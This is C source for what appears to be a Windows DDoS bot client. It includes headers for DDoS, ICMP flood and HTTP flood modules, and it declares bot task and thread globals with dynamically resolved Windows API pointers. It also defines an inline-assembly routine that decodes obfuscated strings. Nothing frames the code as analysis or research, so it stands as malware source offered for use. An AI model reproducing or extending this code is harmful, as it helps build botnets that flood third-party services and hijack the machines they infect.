/*
	+ System Includes
*/
#include < winsock2.h>
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Windns.h>
#include < windows.h>
#include < stdlib.h>
#include < time.h>
#include < stdio.h> 
#include < winioctl.h>
#include < tlhelp32.h >
#include < Wininet.h >
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Ipexport.h >
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Icmpapi.h >
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Psapi.h >
/*
	+ Lib include
*/
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\ws2_32.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Wininet.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Iphlpapi.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Psapi.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Dnsapi.lib")
#pragma warning(disable:4035)
#pragma warning(disable:4090)
#include "bot_struct.h"
#include "bot_rtl.h"

/*
	+ Global variables
*/
BOOL	g_bCreated = FALSE,
		g_bDie = FALSE;
HANDLE	g_hThread = 0;
HANDLE	hThreadDdos = 0;
DWORD	dwThreadId = 0;
DWORD	g_dwThreadId = 0;
GLOBAL_OPTIONS Global = { 0 };
BotOptions botOpt = { 0 };
BotTask g_BotTask = { 0 };
PGLOBAL_OPTIONS pGlobOpt = &Global;
PLOADLIBRARY pLoadLibrary = 0;
PGETPROCADDRESS pGetProcAddr = 0;
WSADATA WSAData =  { 0 };
static APIS api;
IcmpCreateFilePtr	ICMPCreateFile = 0;
IcmpSendEchoPtr		ICMPSendEcho = 0;
IcmpCloseHandlePtr	ICMPCloseHandle = 0;
/*
	+ Functions Defination
*/
USHORT	GetRandomPort();
BOOLEAN StartHttpJob(PBotTask Task);
static int resolve_hostname (const char *host, unsigned long *ip);

/*
	+ Bot Includes
*/

char * WINAPI DeCrypt( char *pStr );

#define NTSIGNATURE(a) ((PVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew))
#include "bot_random.h"
#include "bot_debug.h"
#include "bot_api.h"
#include "bot_config.h"
#include "bot_ddos.h"
#include "bot_icmp.h"
#include "bot_ddos_http.h"

char * 
WINAPI DeCrypt( char *pStr )
{
	PCHAR szTempBuf = malloc(256);
	__asm
	{
		pushad
		mov		esi,[pStr]
		mov		edi,szTempBuf
	__again:
			lodsb
			test	al,al
			jz		__to_exit
			sub		al,77h
			xor		al,33h
			add		al,31h
			stosb
			jmp		__again

	__to_exit:
		stosb
		popad
	} // end asm

	return szTempBuf;
} // end of fucntion eL_DeCrypt